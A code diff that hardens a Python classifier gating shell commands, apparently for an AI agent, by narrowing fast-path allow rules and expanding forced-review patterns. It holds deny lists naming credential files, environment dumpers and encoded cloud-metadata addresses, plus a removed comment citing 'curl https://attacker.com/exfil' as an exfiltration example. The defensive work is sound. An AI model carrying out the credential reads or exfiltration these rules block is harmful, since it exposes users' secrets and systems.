@@ -32,11 +32,8 @@ MAX_INTENT_LEN  = 1024
 
 # ── Tier classification ────────────────────────────────────────────────────────
 _FAST_PATH_PATTERN_STRINGS = [
-    # Filesystem inspection
+    # Filesystem inspection (metadata only, no arbitrary file readers)
     r'^(ls|ll|la|dir)\b',
-    r'^cat\b',
-    r'^(head|tail)\b',
-    r'^(less|more|view)\b',
     r'^(wc|wc\s+-[lwc]+)\b',
     r'^(file|stat|lstat)\b',
     r'^(find)\b(?!.*-(exec|ok|execdir|okdir|delete|fprint|fprint0|fprintf|fls)\b)',
@@ -44,18 +41,15 @@ _FAST_PATH_PATTERN_STRINGS = [
     r'^(pwd)\b',
     r'^(du\s|df\s|df\b)',
 
-    # Text search & processing (read-only)
-    r'^(grep|egrep|fgrep|rg|ag|ack)\b',
-    r'^(awk)\b(?!.*system\s*\()',
+    # Text processing (pure transforms, no file reading)
     r'^(cut|uniq|tr|paste|join)\b',
     r'^(sort)\b(?!.*(-o\b|--output))',
     r'^(diff|cmp|comm)\b',
-    r'^(strings|xxd|od|hexdump)\b',
     r'^(jq)\b',
     r'^(yq)\b',
     r'^(csvkit|csvstat|csvlook)\b',
 
-    # System info (read-only)
+    # System info (read-only, no secret dumpers like env/printenv)
     r'^(echo)\b',
     r'^(printf)\b',
     r'^(date)\b',
@@ -64,7 +58,6 @@ _FAST_PATH_PATTERN_STRINGS = [
     r'^(uptime|w)\b',
     r'^(ps\s|ps\b)',
     r'^(top\s+-b|top\s+-n)',
-    r'^(env|printenv|set\b)',
     r'^(which|whereis|type)\b',
     r'^(man|help|info)\b',
     r'^(history)\b',
@@ -75,12 +68,7 @@ _FAST_PATH_PATTERN_STRINGS = [
     r'^(ulimit\s+-[asSn])',
     r'^(nproc)\b',
 
-    # Network info (read-only, no exfil)
-    # FIX (Bug 2): The original pattern `^(curl|wget)\s+(http[s]?://\S+)\s*$` was too broad.
-    # `curl https://attacker.com/exfil` matched this and went to fast-path ALLOW.
-    # Narrowed to only known-safe patterns: version/info checks, localhost health checks,
-    # and standard read-only lookups with no path (domain-only targets).
-    # Any curl/wget with a non-trivial URL path is forced to slow-path.
+    # Network info (read-only, domain-only health checks, no exfil)
     r'^(curl|wget)\s+https?://[a-zA-Z0-9.-]+/?\s*$',       # domain-only, no path
     r'^curl\s+.*--version\s*$',
     r'^curl\s+http://localhost:\d+/health',
@@ -134,7 +122,9 @@ _FORCED_SLOW_PATH_STRINGS = [
     r'\$\(',
     r'[><]',
     r'&',
+    r'[\r\n]',
     r'\\n',
+    r'\\r',
     r'rm\s',
     r'dd\s',
     r'mkfs',
@@ -154,22 +144,36 @@ _FORCED_SLOW_PATH_STRINGS = [
     r'python.*-c\s',
     r'eval\(',
     r'exec\(',
-    # Sensitive file access
+    # Sensitive file and credential access
     r'\.env',
     r'\.pem',
     r'\.key',
+    r'\.docker',
+    r'\.aws',
+    r'\.kube',
+    r'\.ssh',
+    r'\.netrc',
+    r'\.git-credentials',
+    r'\.gitconfig',
     r'id_rsa',
+    r'id_ed25519',
+    r'id_ecdsa',
+    r'id_dsa',
     r'/etc/passwd',
     r'/etc/shadow',
+    r'/etc/master\.passwd',
+    r'/etc/sudoers',
+    r'/proc/',
+    r'/sys/',
     r'secret',
     r'credential',
-    r'/proc/.*/environ',
-    r'/proc/.*/mem',
-    r'/etc/sudoers',
+    r'api[_-]?key',
+    r'password',
+    r'token',
+    # Environment dumpers
+    r'^(env|printenv)\b',
+    r'^\s*set\b',
     # SSRF / Internal Network Probing
-    # FIX (Bug 5): Original only caught dotted-decimal 169.254.
-    # Attackers encode IMDS IP as decimal (2852039166), hex (0xa9fea9fe),
-    # or add trailing dots. All variants now forced to slow-path.
     r'169\.254',            # standard dotted-decimal
     r'2852039166',          # decimal encoding of 169.254.169.254
     r'0xa9fe',              # hex prefix of 169.254.x.x
@@ -198,16 +202,22 @@ def _truncate(s: str, n: int) -> str:
 def _is_fast_path_cached(command: str) -> bool:
     """LRU-cached classifier. Same command twice = ~0 cost the second time."""
     stripped = command.strip()
+    if '\n' in stripped or '\r' in stripped:
+        return False
     if any(pat.search(stripped) for pat in FORCED_SLOW_PATH):
         return False
     return any(pat.match(stripped) for pat in FAST_PATH_PATTERNS)
 
 
 def is_fast_path(command: str) -> bool:
-    """Public classifier. Truncates over-length input before checking."""
+    """Public classifier. Rejects over-length commands and multi-line sequences."""
     if not command:
         return False
-    return _is_fast_path_cached(_truncate(command, MAX_COMMAND_LEN))
+    if len(command) > MAX_COMMAND_LEN:
+        return False
+    if '\n' in command or '\r' in command:
+        return False
+    return _is_fast_path_cached(command)
 
 
 def analyse(
@@ -227,9 +237,23 @@ def analyse(
     """
     t0 = time.perf_counter()
 
-    # Enforce input caps BEFORE any pattern matching runs.
-    command      = _truncate(command or "", MAX_COMMAND_LEN)
-    prime_intent = _truncate(prime_intent or "", MAX_INTENT_LEN)
+    # Fail closed on input cap violations to prevent discrepancy between
+    # truncated analysis and untruncated runtime execution.
+    if command and len(command) > MAX_COMMAND_LEN:
+        return _adversarial_block(
+            command[:80], prime_intent or "",
+            f"Command length ({len(command)}) exceeds safety cap ({MAX_COMMAND_LEN} bytes)",
+            suppress_audit=suppress_audit
+        )
+    if prime_intent and len(prime_intent) > MAX_INTENT_LEN:
+        return _adversarial_block(
+            command[:80] if command else "", (prime_intent or "")[:80],
+            f"Intent length ({len(prime_intent)}) exceeds safety cap ({MAX_INTENT_LEN} bytes)",
+            suppress_audit=suppress_audit
+        )
+
+    command      = command or ""
+    prime_intent = prime_intent or ""
     
     # ── Phase 0: Unicode Security Normalization ────────────────────────────
     # Strips invisible chars, maps confusables to ASCII, detects script mixing.
